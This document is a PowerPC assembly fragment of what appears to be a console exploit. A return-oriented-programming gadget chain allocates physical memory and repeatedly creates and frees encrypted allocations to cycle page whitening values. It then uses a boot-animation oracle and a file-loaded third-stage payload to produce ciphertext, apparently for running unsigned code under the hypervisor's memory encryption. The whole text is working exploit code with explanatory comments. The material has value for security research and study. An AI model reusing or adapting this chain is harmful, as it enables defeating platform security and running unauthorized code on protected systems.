

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write BootAnimCodePagePhysAddr value into gadget data for XPhysicalAlloc call below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r4_offset) - _second_stage_chain_start, BootAnimCodePagePhysAddr
        
        ###########################################################
        # Gadget N: call XPhysicalAlloc and allocate scratch buffer
        #
        #   r3 = allocation size
        #   r4 = requested address (to be updated by previous gadgets)
        #   r5 = alignment
        #   r6 = page flags: PAGE_READWRITE | MEM_LARGE_PAGES
        ###########################################################
        CALL_FUNC 1, XPhysicalAlloc, R3H=0, R3L=0x00010000, R4H=0, R4L=0x41414141, R5H=0, R5L=0x00010000, R6H=0, R6L=0x20000004
        .fill   0x50, 1, 0x00
        .long   0x00000000, CipherTextScratchBuffer     # r31
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store allocation address
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        # Loop and exhaust half of the possible whitening values for the memory address.
        .rept 512
        
            ###########################################################
            # Gadget N: allocate and free the target address range using the HvxEncrypted APIs to increase the whitening values on the page
            #
            ###########################################################
1:          CREATE_ENCRYPTED_ALLOCATION second_stage_chain_address, 1b - _second_stage_chain_start
            FREE_ENCRYPTED_ALLOCATION
        
        .endr
        
        ###########################################################
        # Gadget N: allocate the target address range using the HvxEncrypted APIs
        #
        ###########################################################
1:      CREATE_ENCRYPTED_ALLOCATION second_stage_chain_address, 1b - _second_stage_chain_start

        ###########################################################
        # Gadget N: copy boot animation oracle data to the encrypted virtual address range
        #
        #   r3 = dst address = encrypted virtual address range
        #   r4 = src address = boot animation oracle data
        #   r5 = size of data to copy
        ###########################################################
        CALL_FUNC 111, memcpy, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=abOracleData, R5H=0, R5L=0x00000010
        
        ###########################################################
        # Gadget N: flush cache and copy cipher text for oracle data
        #
        ###########################################################
1:      FLUSH_AND_COPY_CIPHER_TEXT pPayloadCipherText, 0x10, second_stage_chain_address, 1b - _second_stage_chain_start

        ###########################################################
        # Gadget N: read the third stage payload into a scratch buffer
        #
        #   Note: We must read the payload into a scratch buffer that's not the encrypted address range because the
        #       southbridge cannot do DMA operations to encrypted memory, only unencrypted memory ranges. There doesn't
        #       seem to be a flag to force buffering on ReadFile operations so we use our cipher text scratch buffer
        #       to read the payload data and then memcpy it to the encrypted address range.
        #
        ###########################################################
    _get_payload_cipher_text_offset = 1f - _second_stage_chain_start
1:      READ_FILE third_stage_payload_file_path, pPayloadCipherText2, second_stage_chain_address, _get_payload_cipher_text_offset

        ###########################################################
        # Gadget N: write pPayloadCipherText2 into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r4_offset) - _second_stage_chain_start, pPayloadCipherText2
        
        ###########################################################
        # Gadget N: copy the 3rd stage payload into the encrypted address range
        #
        #   r3 = dst address = encrypted virtual address range
        #   r4 = src address (to be filled in by previous gadgets)
        #   r5 = size of data to copy
        ###########################################################
        CALL_FUNC 1, memcpy, R3H=0, R3L=EncryptedVirtualAddress, R4H=0, R4L=0x41414141, R5H=0, R5L=0x00010000

        ###########################################################
        # Gadget N: flush cache and copy cipher text for third stage payload data
        #
        ###########################################################
1:      FLUSH_AND_COPY_CIPHER_TEXT pPayloadCipherText2, third_stage_max_size, second_stage_chain_address, 1b - _second_stage_chain_start

        ###########################################################
        # Gadget N: free the encrypted allocation for the target address range
        #
        ###########################################################
        FREE_ENCRYPTED_ALLOCATION
        
        # Loop and exhaust the remaining half of the whitening values for the memory address.
        .rept 511
        
            ###########################################################
            # Gadget N: allocate and free the target address range using the HvxEncrypted APIs to increase the whitening values on the page
            #
            ###########################################################
1:          CREATE_ENCRYPTED_ALLOCATION second_stage_chain_address, 1b - _second_stage_chain_start
            FREE_ENCRYPTED_ALLOCATION
        
        .endr
        
        ###########################################################
        # Gadget N: write CipherTextScratchBuffer address into gadget data below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r4_offset) - _second_stage_chain_start, CipherTextScratchBuffer
        
        ###########################################################
        # Gadget N: call XPhysicalFree and free the scratch buffer
        #
        #   r3 = scratch buffer address (to be filled in by gadgets above)
        ###########################################################
        CALL_FUNC 1, MmFreePhysicalMemory, R3H=0, R3L=0, R4H=0, R4L=0x41414141
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        